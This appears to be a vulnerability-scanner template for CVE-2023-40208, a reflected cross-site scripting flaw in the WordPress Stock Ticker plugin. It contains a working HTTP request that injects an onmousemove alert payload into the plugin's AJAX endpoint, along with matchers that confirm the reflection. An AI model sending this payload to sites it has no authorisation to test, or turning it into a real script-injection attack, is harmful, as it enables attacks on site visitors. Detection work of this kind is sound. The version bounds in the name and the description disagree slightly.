http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - stock_ticker
    - onmousemove=alert(document.domain)
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=stockticker_load&symbols=MSFT&class=%22+onmousemove%3Dalert%28document.domain%29+

    '
id: CVE-2023-40208
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:urosevic:stock_ticker:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-40208
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.26209
    epss-score: 0.00064
  description: 'The Stock Ticker plugin for WordPress is vulnerable to Reflected Cross-Site
    Scripting in the ajax_stockticker_load function in versions up to, and including,
    3.23.3 due to insufficient input sanitization and output escaping. This makes
    it possible for unauthenticated attackers to inject arbitrary web scripts in pages
    that execute if they can successfully trick a user into performing an action such
    as clicking on a link.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: stock_ticker
    vendor: urosevic
    verified: true
  name: Stock Ticker <= 3.23.2 - Cross-Site Scripting
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/stock-ticker/stock-ticker-3233-reflected-cross-site-scripting
  - https://patchstack.com/database/vulnerability/stock-ticker/wordpress-stock-ticker-plugin-3-23-3-unauth-reflected-cross-site-scripting-xss-vulnerability
  - https://wordpress.org/plugins/stock-ticker/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-40208
  - https://patchstack.com/database/vulnerability/stock-ticker/wordpress-stock-ticker-plugin-3-23-3-unauth-reflected-cross-site-scripting-xss-vulnerability?_s_id=cve
  remediation: Fixed in version 3.23.3
  severity: medium
  tags: cve2023,cve,wordpress,wp-plugin,wpscan,wp,stock-ticker,xss,urosevic
